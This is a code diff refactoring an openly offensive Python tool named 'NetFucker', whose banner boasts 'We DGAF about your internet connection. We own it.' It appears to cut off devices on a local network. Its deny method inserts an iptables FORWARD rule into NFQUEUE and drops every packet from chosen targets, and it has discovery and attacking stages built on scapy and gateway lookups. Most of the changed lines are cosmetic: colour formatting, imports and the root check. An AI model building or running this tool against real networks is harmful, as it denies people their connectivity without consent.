@@ -1,7 +1,15 @@
-from UpdaterFiles.auto_updater import current_platform, Updater
+from UpdaterFiles.auto_updater import current_platform, Updater, has_root
+from sys import exit, executable
+from UpdaterFiles.auto_updater import Appearance as App
+from os import execv, get_terminal_size
+from subprocess import call
 try:
     current_platform.determine_platform()
+    if not has_root():
+        print(f"{App.NeTfUcKeR()}{App.wut()} Please run as Root... Quitting!!")
+        exit(1)
     Updater.updating()
+    Updater.update_lib("wheel")
     Updater.update_lib("scapy")
     Updater.update_lib("netifaces")
     Updater.update_lib("netfilterqueue")
@@ -9,49 +17,47 @@ try:
     Updater.update_lib("termcolor")
     Updater.update_lib("keyboard")
     import scapy.all as scapy
-    import os
-    import subprocess
     import netifaces
     import netfilterqueue
     from configparser import ConfigParser
     import threading
-    import sys
     import time
     from colorama import init, Fore, Back, Style
     from termcolor import colored
 
-    init()
+    init(autoreset=True)
 
     config = ConfigParser(allow_no_value=False, default_section="DEFAULT")
 
     def NeTfUcKeR():
-        return Fore.WHITE + "[" + Fore.RED + "N" + Fore.YELLOW + "e" + Fore.LIGHTGREEN_EX + "t" + Fore.MAGENTA + "F" + Fore.CYAN + "u" + Fore.BLUE + "c" + Fore.RED + "K" + Fore.YELLOW + "e" + Fore.LIGHTGREEN_EX + "r" + Fore.WHITE + "]"
+        return "{}[{}N{}e{}t{}F{}u{}c{}K{}e{}r{}]".format(Fore.WHITE,Fore.RED,Fore.YELLOW,Fore.LIGHTGREEN_EX,Fore.MAGENTA,Fore.CYAN,Fore.BLUE,Fore.RED,Fore.YELLOW,Fore.LIGHTGREEN_EX,Fore.WHITE)
 
     def NeTfUcKeRNo_Tag():
-        return Fore.RED + "N" + Fore.YELLOW + "e" + Fore.LIGHTGREEN_EX + "t" + Fore.MAGENTA + "F" + Fore.CYAN + "u" + Fore.BLUE + "c" + Fore.RED + "K" + Fore.YELLOW + "e" + Fore.LIGHTGREEN_EX + "r" + Fore.WHITE + ""
+        return "{}N{}e{}t{}F{}u{}c{}K{}e{}r{}".format(Fore.RED,Fore.YELLOW,Fore.LIGHTGREEN_EX,Fore.MAGENTA,Fore.CYAN,Fore.BLUE,Fore.RED,Fore.YELLOW,Fore.LIGHTGREEN_EX,Fore.WHITE)
 
     def print_DiscoveringStage():
-        print(Fore.GREEN + "==================" + Fore.GREEN + "[" + Fore.BLUE + " D " + Fore.RED + "I " + Fore.YELLOW + "S " + Fore.LIGHTGREEN_EX + "C " + Fore.MAGENTA + "O " + Fore.CYAN + "V " + Fore.BLUE + "E " + Fore.RED + "R " + Fore.YELLOW + "Y    " + Fore.CYAN + "S " + Fore.BLUE + "T " + Fore.RED + "A " + Fore.YELLOW + "G " + Fore.LIGHTGREEN_EX + "E " + Fore.GREEN + "]" + Fore.GREEN + "==================")
+        print("{}=================={}[{}D{}I{}S{}C{}O{}V{}E{}R{}Y{}S{}T{}A{}G{}E{}]{}==================".format(Fore.GREEN,Fore.GREEN,Fore.BLUE,Fore.RED,Fore.YELLOW,Fore.LIGHTGREEN_EX,Fore.MAGENTA,Fore.CYAN,Fore.BLUE,Fore.RED,Fore.YELLOW,Fore.CYAN,Fore.BLUE,Fore.RED,Fore.YELLOW,Fore.LIGHTGREEN_EX,Fore.GREEN,Fore.GREEN))
 
     def print_AttackingStage():
-        print("\n" + Fore.GREEN + "==================" + Fore.GREEN + "[" + Fore.BLUE + " A " + Fore.RED + "T " + Fore.YELLOW + "T " + Fore.LIGHTGREEN_EX + "A " + Fore.MAGENTA + "C " + Fore.CYAN + "K " + Fore.BLUE + "I " + Fore.RED + "N " + Fore.YELLOW + "G    " + Fore.CYAN + "S " + Fore.BLUE + "T " + Fore.RED + "A " + Fore.YELLOW + "G " + Fore.LIGHTGREEN_EX + "E " + Fore.GREEN + "]" + Fore.GREEN + "==================", end="\r")
+        print("\n{}=================={}[{} A {}T {}T {}A {}C {}K {}I {}N {}G    {}S {}T {}A {}G {}E {}]{}==================".format(Fore.GREEN,Fore.GREEN,Fore.BLUE,Fore.RED,Fore.YELLOW,Fore.LIGHTGREEN_EX,Fore.MAGENTA,Fore.CYAN,Fore.BLUE,Fore.RED,Fore.YELLOW,Fore.CYAN,Fore.BLUE,Fore.RED,Fore.YELLOW,Fore.LIGHTGREEN_EX,Fore.GREEN,Fore.GREEN), end="\r")
 
     def print_Important():
-        print(Fore.GREEN + "==================" + Fore.GREEN + "[" + Fore.BLUE + " I " + Fore.RED + "M " + Fore.YELLOW + "P " + Fore.LIGHTGREEN_EX + "O " + Fore.MAGENTA + "R " + Fore.CYAN + "T " + Fore.BLUE + "A " + Fore.RED + "N " + Fore.YELLOW + "T " + Fore.GREEN + "]" + Fore.GREEN + "==================")
+        print("{}=================={}[{} I {}M {}P {}O {}R {}T {}A {}N {}T {}]{}==================".format(Fore.GREEN,Fore.GREEN,Fore.BLUE,Fore.RED,Fore.YELLOW,Fore.LIGHTGREEN_EX,Fore.MAGENTA,Fore.CYAN,Fore.BLUE,Fore.RED,Fore.YELLOW,Fore.GREEN,Fore.GREEN))
 
 
     class Appearance:
         def wut():
-            return Fore.WHITE + "[" + Fore.RED + "!" + Fore.WHITE + "]"
+            return "{}[{}!{}]".format(Fore.WHITE,Fore.RED,Fore.WHITE)
 
         def huh():
-            return Fore.WHITE + "[" + Fore.LIGHTBLUE_EX + "?" + Fore.WHITE + "]"
+            return "{}[{}?{}]".format(Fore.WHITE,Fore.LIGHTBLUE_EX,Fore.WHITE)
 
         def hey():
-            return Fore.WHITE + "[" + Fore.LIGHTGREEN_EX + "+" + Fore.WHITE + "]"
+            return "{}[{}+{}]".format(Fore.WHITE,Fore.LIGHTGREEN_EX,Fore.WHITE)
 
         def printBanner():
-            print(Fore.RED + """
+            if get_terminal_size().columns >= 122:
+                print(f"""{Fore.RED}
                     :::!~!!!!!:.
                 .xUHWH!! !!?M88WHX:.
             .X*#M@$!!  !X!M$$$$$$WWx:.
@@ -72,12 +78,11 @@ W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
 Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!             ██║╚██╗██║██╔══╝     ██║   ██╔══╝  ██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
 $R@i.~~ !     :   ~$$$$$B$$en:``              ██║ ╚████║███████╗   ██║   ██║     ╚██████╔╝╚██████╗██║  ██╗███████╗██║  ██║
 ?MXT@Wx.~    :     ~"##*$$$$M~                ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
-            """ + Fore.LIGHTGREEN_EX + """
+{Fore.LIGHTGREEN_EX}
 We DGAF about your internet connection. We own it.""")
+            else:
+                print(f"{Fore.LIGHTBLACK_EX}Not printing banner: Current terminal width too small\n{Fore.RED}NETFUCKER\n{Fore.LIGHTGREEN_EX}We DGAF about your internet connection. We own it.")
             return True # It went through fine. Quit this function
-
-    def has_root():
-        return os.geteuid() == 0
 
 
     def gateway_address():
@@ -180,7 +185,7 @@ We DGAF about your internet connection. We own it.""")
             self.targets.append(target)
 
         def deny(self, threaded=True):
-            subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
+            call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
             queue = netfilterqueue.NetfilterQueue()
             queue.bind(1, lambda packet: packet.drop())
             for target in self.targets:
@@ -195,13 +200,10 @@ We DGAF about your internet connection. We own it.""")
         def restore(self):
             for target in self.targets:
                 target.stop()
-            subprocess.call(["iptables", "--flush"])
+            call(["iptables", "--flush"])
 
 
     if __name__ == '__main__':
-        if not has_root():
-            print(colored(F"{NeTfUcKeR()}{Appearance.wut()} Please run as Root... Quitting!!", "red"))
-            sys.exit(1)
         Appearance.printBanner()
         print(colored(f"{NeTfUcKeR()}{Appearance.hey()} Running as Root", "green"))
         input(f"{NeTfUcKeR()}{Appearance.huh()} Press ENTER to continue...")
@@ -226,12 +228,12 @@ We DGAF about your internet connection. We own it.""")
         except IndexError:
             open_nano = input(f"""{NeTfUcKeR()}{Appearance.wut()} invalid IP range?\nOpen NANO CLI-Based text editor to rectify "./Configuration/config.ini"? ("""+Fore.LIGHTGREEN_EX+"Y"+Fore.WHITE+"/"+Fore.RED+"N"+Fore.WHITE+") > ")
             if open_nano.lower() in ["yes", "y"]:
-                out = subprocess.call(["nano", "./Configuration/config.ini"])
+                out = call(["nano", "./Configuration/config.ini"])
                 if out == 0:
                     print(f"{NeTfUcKeR()}{Appearance.hey()}" + colored(f"IP Range updated", "green", attrs=["bold"]))
                     print(f"{NeTfUcKeR()}{Appearance.hey()}" + colored(f"Relaunching {NeTfUcKeRNo_Tag()} :D", "green", attrs=["bold"]))
                     time.sleep(2) # give a moment to let the user know what will happen.
-                    os.execv(sys.executable, ["python3", __file__])
+                    execv(executable, ["python3", __file__])
                 else:
                     print(f"{NeTfUcKeR()}{Appearance.wut()}" + colored(f"Some error occured... Try manually with editting it with some text editor", "red", attrs=["bold"]))
             elif open_nano.lower() in ["no", "n"]:
@@ -242,8 +244,6 @@ We DGAF about your internet connection. We own it.""")
                 quit()
 
 except KeyboardInterrupt:
-    import subprocess
-    from colorama import Fore
-    print("\n" + Fore.WHITE + "[" + Fore.RED + "N" + Fore.YELLOW + "e" + Fore.LIGHTGREEN_EX + "t" + Fore.MAGENTA + "F" + Fore.CYAN + "u" + Fore.BLUE + "c" + Fore.RED + "K" + Fore.YELLOW + "e" + Fore.LIGHTGREEN_EX + "r" + Fore.WHITE + "]" + Fore.WHITE + "[" + Fore.LIGHTGREEN_EX + "+" + Fore.WHITE + "]" + " Control-C press detected. Exitting!")
-    subprocess.call(["iptables", "--flush"])
+    print(f"\n{NeTfUcKeR()}Control-C press detected. Exitting!")
+    call(["iptables", "--flush"])
     quit()
